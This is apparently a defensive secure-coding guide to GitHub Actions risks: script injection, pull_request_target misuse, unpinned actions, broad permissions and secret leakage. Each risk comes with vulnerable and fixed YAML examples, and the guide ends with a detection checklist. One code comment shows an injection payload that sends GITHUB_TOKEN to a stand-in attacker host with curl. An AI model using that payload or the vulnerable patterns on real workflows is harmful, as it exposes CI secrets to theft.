# GitHub Actions Security Patterns

## Critical Vulnerabilities

| Pattern | Risk | Severity | Fix |
|---------|------|----------|-----|
| `${{ github.event.pull_request.title }}` in `run:` | Script injection → arbitrary code exec | CRITICAL | Assign to env var first |
| `${{ github.event.issue.body }}` in `run:` | Script injection | CRITICAL | Assign to env var first |
| `pull_request_target` + `actions/checkout` of PR ref | Untrusted code gets secrets access | CRITICAL | Never checkout PR code in target |
| Unpinned action: `uses: action@main` | Supply chain (tag can be mutated) | HIGH | Pin to full SHA |
| `permissions: write-all` or no permissions key | Over-permissioned GITHUB_TOKEN | HIGH | Specify minimal per-job permissions |
| Secrets in step outputs/logs | Credential exposure | HIGH | Use `::add-mask::` |
| Self-hosted runners without ephemeral mode | Persistent compromise | HIGH | Use ephemeral/container runners |
| Third-party actions from unverified publishers | Unknown code execution | MEDIUM | Audit code, verify publisher, pin SHA |
| `ACTIONS_STEP_DEBUG` in production | May leak secrets in verbose output | MEDIUM | Remove debug flags |

## Script Injection — The #1 GitHub Actions Vulnerability

### DANGEROUS: Direct interpolation in run blocks
```yaml
# CRITICAL: Attacker controls PR title → arbitrary command execution
- run: |
    echo "Processing PR: ${{ github.event.pull_request.title }}"
    # If title is: "; curl attacker.com/steal?token=$GITHUB_TOKEN #
    # Result: commands execute with full token access
```

### ALL injectable contexts (treat as untrusted):
```
github.event.issue.title
github.event.issue.body
github.event.pull_request.title
github.event.pull_request.body
github.event.comment.body
github.event.review.body
github.event.discussion.title
github.event.discussion.body
github.event.pages.*.page_name
github.event.commits.*.message
github.event.commits.*.author.name
github.event.head_commit.message
github.event.head_commit.author.name
github.head_ref  # Branch name (attacker-controlled in forks)
```

### SAFE: Use environment variables
```yaml
- name: Process PR
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "Processing PR: $PR_TITLE"
    # Shell properly escapes the variable
```

## pull_request_target Attacks

### DANGEROUS: Checking out PR code with secrets
```yaml
# CRITICAL: Fork PR code executes with repo secrets
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # PR code!
      - run: npm install  # Attacker's package.json → postinstall steals secrets
```

### SAFE: Only checkout base branch, or use separate jobs
```yaml
on: pull_request_target
jobs:
  # Job 1: Trusted code only
  label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4  # Default = base branch (safe)
      - run: echo "Only base branch code here"
```

## Action Pinning

### DANGEROUS: Tag-based (can be mutated retroactively)
```yaml
uses: actions/checkout@v4      # Tag can be moved to malicious commit
uses: some-org/action@main     # Branch HEAD changes constantly
```

### SAFE: SHA-pinned
```yaml
uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29  # v4.1.6
# Comment with version for readability, SHA for security
```

## Permissions

### DANGEROUS: Overpermissioned (default if not specified)
```yaml
# If no permissions key: gets all default permissions (often write)
jobs:
  build:
    runs-on: ubuntu-latest
```

### SAFE: Minimal permissions
```yaml
permissions: {}  # Top-level: deny all by default

jobs:
  build:
    permissions:
      contents: read      # Only what's needed
      pull-requests: write # Only if posting comments
    runs-on: ubuntu-latest
```

## Real-World Attacks (2025)

### tj-actions/changed-files (March 2025)
- **CVE-2025-30066**: 23,000+ repos affected
- **Method**: Attacker gained maintainer access, modified existing tags to point to malicious code
- **Impact**: Stole secrets from CI runs
- **Lesson**: Pin to SHA, not tags

### Shai Hulud Worm (November 2025)
- Self-replicating across 20,000+ repos and 1,700 npm packages
- **Method**: Exploited `pull_request_target` to get write access + secrets
- **Impact**: Published malicious npm packages, modified other repos
- **Lesson**: Never checkout untrusted code with secrets access

### Nx s1ngularity (August 2025)
- **Method**: `pull_request_target` exploit to steal npm publishing tokens
- **Impact**: 8 malicious package versions published (harvested credentials)
- **Lesson**: Separate trusted/untrusted execution environments

## Secrets Security

```yaml
# DANGEROUS: Secret may appear in logs
- run: echo "Token: ${{ secrets.API_TOKEN }}"

# DANGEROUS: Secrets passed to untrusted action
- uses: random-org/untrusted-action@v1
  with:
    token: ${{ secrets.GITHUB_TOKEN }}

# SAFE: Mask secrets, minimize exposure
- run: echo "::add-mask::${{ secrets.API_TOKEN }}"
- run: |
    # Use secret without echoing
    curl -H "Authorization: Bearer $TOKEN" https://api.example.com
  env:
    TOKEN: ${{ secrets.API_TOKEN }}
```

## Detection Tool: zizmor

Static analysis specifically for GitHub Actions:
- Detects script injection patterns
- Finds unpinned actions
- Identifies excessive permissions
- Flags dangerous trigger combinations
- Open source: https://github.com/woodruffw/zizmor

## Detection Checklist

- [ ] No direct interpolation of event data in `run:` blocks
- [ ] All actions pinned to SHA (not tag/branch)
- [ ] Permissions explicitly minimized per job
- [ ] No `pull_request_target` with checkout of PR code
- [ ] Secrets not passed to untrusted actions
- [ ] Self-hosted runners are ephemeral
- [ ] No `ACTIONS_STEP_DEBUG` in production workflows
- [ ] Third-party actions audited and from verified publishers
- [ ] `contents: write` only when actually needed
- [ ] Workflow files have CODEOWNERS protection
